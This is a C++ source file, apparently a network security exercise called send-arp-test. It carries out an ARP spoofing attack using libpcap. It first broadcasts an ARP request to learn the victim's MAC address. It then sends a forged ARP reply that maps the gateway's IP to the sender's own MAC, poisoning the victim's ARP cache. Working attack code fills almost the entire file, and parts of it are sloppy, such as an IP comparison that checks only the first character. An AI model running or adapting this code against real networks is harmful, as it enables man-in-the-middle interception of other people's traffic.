#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <stdbool.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getmac.h"
#include "getIpAddr.h"


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct eth_hdr{
        unsigned char h_dest[6];        //destination ether addr
        unsigned char h_source[6];      //source ether addr
        unsigned short h_proto;         //packet type id filed
} __attribute__((packed));

struct arp_hdr{
    unsigned short ar_hrd;          //hardware type : ethernet
    unsigned short ar_pro;          //protocol      : ip
    unsigned char  ar_hln;          //hardware size
    unsigned char  ar_pln;          //protocal size
    unsigned short ar_op;           //opcode request or reply
    unsigned char  ar_sha[6];       //sender mac
    //unsigned int  ar_sip[4];       //sender IP
	struct in_addr ar_sip;
    unsigned char  ar_tha[6];       //Target mac (my)
    struct in_addr ar_tip[4];       //Target IP  (my)
} __attribute__((packed));

void usage() {
	printf("syntax: send-arp-test <interface> <senderIP> <targetIP>\n");
	printf("sample: send-arp-test wlan0 172.30.1.40 172.30.1.254\n");
}


int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	size_t myMacSize = strlen(getMacAddr(argv[1]))+1;
	//printf("sizeof : %u\n", myMacSize);
	char* myMacAddr = (char*)malloc(myMacSize);
	strncpy(myMacAddr, getMacAddr(argv[1]), myMacSize);
	printf("myMacAddr : %s\n", myMacAddr);
	
	char myEth0_addr[20] = {0,};
	char* myIpAddr = (char *)malloc(sizeof(char *));
	myIpAddr = getIpAddr(dev);
	
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// get victim's Mac Address
	EthArpPacket packet;
    
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // victim.mac a0:c5:89:77:cb:03
	packet.eth_.smac_ = Mac(myMacAddr); // me
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // Request
	packet.arp_.smac_ = Mac(myMacAddr); // me.mac
	packet.arp_.sip_ = htonl(Ip(myIpAddr)); // me.ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // victim.mac
	packet.arp_.tip_ = htonl(Ip(argv[2])); // victim.ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    
	pcap_close(handle);

	//-------------------------
	char errbuf1[PCAP_ERRBUF_SIZE];
    pcap_t* handle1 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf1);
    if (handle1 == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf1);
        return -1;
    }
	static char* victimMacAddr;
	char* tempMac;
	
    while (true) {
    	struct pcap_pkthdr* header;
		//struct ether_header* ehdr;
		//struct EthArpPacket* hdr;
		//struct libnet_ethernet_hdr* ehdr;
		struct eth_hdr* ehdr;
		struct arp_hdr* ahdr;

		char* ehdr_dmac;
		short ehdr_proto;


        const u_char* packet0;
        int res = pcap_next_ex(handle1, &header, &packet0);
	
		//ehdr = (struct ether_header *)packet;
		//ehdr = (struct libnet_ethernet_hdr *)packet;
		ehdr = (struct eth_hdr *)packet0;
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle1));
            break;
        }

		//unsigned char h_dest[6];        //destination ether addr
        //unsigned char h_source[6];      //source ether addr
        //unsigned short h_proto;         //packet type id filed

		ehdr_dmac = ether_ntoa((struct ether_addr *)ehdr->h_dest);
		ehdr_proto = htons(ehdr->h_proto);

		packet0 += 14;
		ahdr = (struct arp_hdr *)packet0;
		
	    //unsigned short ar_op;           //opcode request or reply
		//unsigned char  ar_sha[6];       //sender mac
		//unsigned char  ar_sip[4];       //sender IP
		//unsigned char  ar_tha[6];       //Target mac (my)
		//unsigned char  ar_tip[4];       //Target IP  (my)
		
		unsigned short ahdr_op = htons(ahdr->ar_op);
		//char* ahdr_sip = reinterpret_cast<char*>(ahdr->ar_sip);
		char* ahdr_sip = inet_ntoa((ahdr->ar_sip));
		
		printf("ehdr_dmac : %s\n", ehdr_dmac);
		printf("ehdr_proto : %u\n", ehdr_proto);
		printf("adhr_op : %u\n", ahdr_op);
		printf("adhr_sip : %s\n", ahdr_sip);
		printf("argv[2] : %s\n", argv[2]);
		
		int cmp = strcmp(ehdr_dmac, myMacAddr);
		bool flag1 = cmp ? 0 : 1;
		
		//bool flag1 = 1;
		bool flag2 = ehdr_proto == 2054;
		bool flag3 = ahdr_op == 2;
		bool flag4 = *ahdr_sip == *argv[2];
		printf("flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);
 
		if(flag1 && flag2 && flag3 && flag4){
			printf("myMacAddr : %s\n", myMacAddr);
			victimMacAddr = ether_ntoa((const struct ether_addr *)(ahdr->ar_sha));
			/*
			size_t tempSize = strlen(ether_ntoa((const struct ether_addr *)(ahdr->ar_sha)))+1;
			printf("tempSize : %u\n", tempSize);
			tempMac = (char*)malloc(tempSize);
			strncpy(tempMac, ether_ntoa((const struct ether_addr *)(ahdr->ar_sha)), tempSize);
			*/
			
					
			
			printf("myMacAddr11 : %s\n", myMacAddr);			
			break;
		}
    }
	
	printf("victimMacAddr : %s\n", victimMacAddr);

    pcap_close(handle1);
	//-------------------------

	char errbuf2[PCAP_ERRBUF_SIZE];
	pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf2);
	if (handle2 == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf2);
		return -1;
	}
	//char* myMacAddr2 = (char *)malloc(sizeof(char *));
	//myMacAddr2 = getMacAddr(argv[1]);
	//printf("myMacAddr2-1 : %s\n", myMacAddr2);	
	//printf("victimMacAddr2 : %s\n", victimMacAddr);
	printf("myMacAddr1 : %s\n", myMacAddr);	
	printf("victimMacAddr1 : %s\n", victimMacAddr);
	
	EthArpPacket packet1;
    
	packet1.eth_.dmac_ = Mac(victimMacAddr); // victim.mac // 
	packet1.eth_.smac_ = Mac(myMacAddr); // me
	packet1.eth_.type_ = htons(EthHdr::Arp);
	
	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet1.arp_.pro_ = htons(EthHdr::Ip4);
	packet1.arp_.hln_ = Mac::SIZE;
	packet1.arp_.pln_ = Ip::SIZE;
	packet1.arp_.op_ = htons(ArpHdr::Reply); // Reply 
	packet1.arp_.smac_ = Mac(myMacAddr); // me.mac
	packet1.arp_.sip_ = htonl(Ip(argv[3])); // gateway.ip 
	packet1.arp_.tmac_ = Mac(victimMacAddr); // victim.mac // 
	packet1.arp_.tip_ = htonl(Ip(argv[2])); // victim.ip

	int res1 = pcap_sendpacket(handle2, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
	if (res1 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle2));
	}
    

	pcap_close(handle2);
	

}
